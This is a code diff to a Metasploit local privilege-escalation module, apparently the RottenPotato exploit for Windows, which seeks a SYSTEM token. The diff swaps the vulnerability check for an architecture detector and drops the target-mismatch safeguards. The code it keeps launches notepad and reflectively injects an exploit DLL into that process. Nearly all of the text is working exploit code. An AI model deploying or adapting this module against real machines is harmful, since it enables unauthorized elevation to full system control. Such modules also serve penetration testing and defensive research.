@@ -22,9 +22,6 @@ class MetasploitModule < Msf::Exploit::Local
 	to achieve a SYSTEM handle for elevation of privilege. Currently the module
  	does not spawn as SYSTEM, however once achieving a shell, one can easily 
 	use incognito to impersonate the token.
-
-	This is subject to change by the end of the week. I will fix a few bugs
-	by the end of the week, and move to easy adaptions of the port & CLSID.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -61,22 +58,21 @@ class MetasploitModule < Msf::Exploit::Local
     }))
   end
 
-  def check
+  def check_arch
     os = sysinfo["OS"]
 
-    if os !~ /windows/i
-      # Non-Windows systems are definitely not affected.
-      return Exploit::CheckCode::Safe
-    end
-
     if sysinfo["Architecture"] =~ /(wow|x)64/i
-      arch = ARCH_X64
+      if session.railgun.kernel32.IsWow64Process(-1, 4)["Wow64Process"] == "\x00\x00\x00\x00"
+	arch = ARCH_X64
+      else
+	arch = ARCH_X86
+      end
     elsif sysinfo["Architecture"] == ARCH_X86
       arch = ARCH_X86
     end
 
 
-    return Exploit::CheckCode::Appears
+    return arch
   end
 
   def exploit
@@ -84,16 +80,9 @@ class MetasploitModule < Msf::Exploit::Local
       fail_with(Failure::None, 'Session is already elevated')
     end
 
-    if check == Exploit::CheckCode::Safe
-      fail_with(Failure::NotVulnerable, "Exploit not available on this system.")
-    end
 
     if sysinfo["Architecture"] =~ /wow64/i
       fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
-    elsif sysinfo["Architecture"] == ARCH_X64 && target.arch.first == ARCH_X86
-      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
-    elsif sysinfo["Architecture"] == ARCH_X86 && target.arch.first == ARCH_X64
-      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
     end
 
     print_status('Launching notepad to host the exploit...')
@@ -107,10 +96,11 @@ class MetasploitModule < Msf::Exploit::Local
     end
 
     print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
-    if target.arch.first == ARCH_X86
-      dll_file_name = 'MSFRottenPotato_x86.dll'
+    architecture = check_arch
+    if architecture == ARCH_X64
+      dll_file_name = 'rottenpotato_x64.dll'
     else
-      dll_file_name = 'MSFRottenPotato_x64.dll'
+      dll_file_name = 'rottenpotato_x86.dll'
     end
 
     library_path = ::File.join(dll_file_name)
